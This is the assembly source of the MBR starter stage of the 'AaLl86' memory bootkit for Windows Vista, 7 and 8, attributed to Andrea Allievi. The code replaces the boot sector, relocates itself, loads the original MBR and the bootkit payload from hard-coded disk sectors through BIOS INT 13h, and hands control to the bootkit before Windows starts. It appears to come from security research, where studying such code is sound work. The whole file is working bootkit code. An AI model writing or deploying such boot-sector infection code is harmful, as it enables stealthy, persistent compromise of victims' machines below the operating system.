;AaLl86 Windows Vista/Seven/Eight x86 Memory Bootkit
;Starter program
;Compile with FASM: https://flatassembler.net/
;Copyright© 2013 Andrea Allievi

INCLUDE "RamBootkit.inc"
ORG 0600h

use16

main:
jmp start
SIGNATURE db 0,0,"AaLl86",0
STARTER_TYPE db 1                       ; Starter type: 1 - Master boot sector
BOOTKIT_START_SECT dd 010h              ; Bootkit Program start sector LODWORD
REMOVABLE_ORG_MBR_SECT dd 12h           ; Bootkit Program start sector HIDWORD (unused) OR
                                        ; Removable device original MBR sector (for safe removing)
ORIGINAL_MBR_SECT dd 00h                ; Original MBR Sector LODWORD
WINDOWS_MBR_SECT dd 00h                 ; Standard Windows MBR Sector LODWORD OR
                                        ; Original MBR Sector HIDWORD
BOOTKIT_PROGRAM_SIZE dw 02h             ; Bootkit program size (in sector)

BOOT_DRIVE db 81h                       ; Boot Drive: 0x80 = First HD    0x81 = Second Hard Disk    0x00 = First Floppy    0x01 = Second floppy
CUR_DRIVE db 00h                        ; Current Drive (filled at routime)
START_STRING db "Starting Memory Bootkit...", 0Dh, 0Ah, 00h

start:
    cli
    xor ax,ax
    ; Ora imposta uno stack decente
    mov ss, ax                  ; Stack Segment
    mov [ss:7bfeh], sp          ; Salva il vecchio Stack Pointer in [7bfeh]... Il perchè? semplice: 7C00 - 7BFE = 2
    mov sp, 7bfeh               ; Alla fine del codice quando lo SP è a 0x7c00 posso fare un pop sp
    push ds
    mov ds, ax
    pushad

    ; Move myself at address 0x0:600
    mov    ds, ax               ; ds = 0
    xor    ax, ax
    mov    es, ax               ; es = 0
    mov    si, LOADLOC          ; si = 0x7c00
    mov    di, 600h             ; di = 0x0600
    mov    cx, 100h             ; MOVSW = move word from address DS:SI to ES:DI.
                                ; REP MOVSW = Move CX words from DS:[SI] to ES:[DI].
    rep movsw                   ; Copia 200 bytes del MBR infetto all'indirizzo: 0x9f00h:0
    push es
    push from_new_selector
    retf


from_new_selector:
    sti                    ; Abilita gli interrupt
    mov cx, ss
    mov ds, cx

    ; Save current drive in a variable
    mov byte [cs:CUR_DRIVE], dl
    cmp dl, byte [cs:BOOT_DRIVE]
    jz _continue
    mov si, START_STRING
    call WriteMessage

_continue:
    ; Now read original sector
    ; Overwrite original MBR sector number (if needed)
    and dword [cs:REMOVABLE_ORG_MBR_SECT], 0
    cmp dword [cs:WINDOWS_MBR_SECT], 0
    jz _no_win_sector

    pushd ebx
    mov ebx, dword [cs:WINDOWS_MBR_SECT]
    mov dword [cs:ORIGINAL_MBR_SECT], ebx
    and dword [cs:WINDOWS_MBR_SECT], 0
    popd ebx

_no_win_sector:
    mov bx, ORIGINAL_MBR_SECT
    mov cx, 1
    mov di, LOADLOC
    mov dl, byte [cs:BOOT_DRIVE]        ; Read from boot drive, not current one
    call ReadSector

    ; Read Bootkit Sector
    push es
    mov bx, CODEBASEIN1MB
    mov es, bx          ; Bootkit start buffer selector
    xor di, di          ; Bootkit start buffer offset
    mov bx, BOOTKIT_START_SECT
    mov cx, word [cs:BOOTKIT_PROGRAM_SIZE]
    mov dl, byte [cs:CUR_DRIVE]        ; Read from current drive
    call ReadSector
    pop es

Exit:
    ; Now return to new selector and offset
    popad
    pop ds
    pop sp
    mov dl, byte [cs:BOOT_DRIVE]        ; Initialize the actual boot drive
    jc JumpToMbr

    jmp far CODEBASEIN1MB:00h

JumpToMbr:
    jmp far 00h:LOADLOC
;--------------------------------------------------------------------------------------------------
; ReadSector Procedure
; Input param: BX = Sector descriptor offset
;              CX = Number of sector to read
;              DL = Hard disk drive index to read from
;              ES:DI = Destination buffer
ReadSector:
    ; Check Drive Extension presence
    push bx
    push cx
    mov ah, 041h
    mov bx, 055AAh
    int 13h
    pop cx
    jc DontUseExt
    cmp bx, 0AA55h
    jnz DontUseExt

    ; Actually Ext. Read a sector:
    pop bx
    xor ax, ax
    mov ah, 042h
    pushd dword [cs:bx+4]           ; HIDWORD of absolute sector to read
    pushd dword [cs:bx]             ; LODWORD of absolute sector to read
    push es                         ; Selector of pointer to memory buffer (little endian)
    push di                         ; Offset of pointer to memory buffer
    push cx                         ; Number of sector to read
    push 010h                       ; Sizeof (DAP)
    mov si, sp
    int 13h
    add sp, 10h
    retn

DontUseExt:
    ; If we are here we can't use Drive Extension, use regular Read (if possible)
    ; Read original MBR:
    pop bx
    mov ah, 02h
    mov al, cl          ; Number of sector to read
    mov cl, byte [cs:bx]
    inc cl              ; In CHS addressing Sector always start with zero
    mov ch, 00h         ; Track number
    mov dh, 00h         ; Head number
    mov bx, di          ; Restore output buffer
    int 13h
    retn
;------------------------------------------------------------------------------------------------

;------------------------------------------------------------------------------------------------
; WriteMessage Procedure
; Input param: DS:SI = Output string buffer
WriteMessage:
     push ax
     push bx
   .WMStart:
     lodsb
     cmp al, 0
     jz .WMExit
     mov bx, 0Fh        ; Set White color
     mov ah, 0Eh        ; Teletype output
     int 10h
     jmp .WMStart

   .WMExit:
     pop bx
     pop ax
     ret
;------------------------------------------------------------------------------------------------

ends:
times 510-($-main) db 0 ; 512 total bytes
signa   db 55h,0aah             ;signature
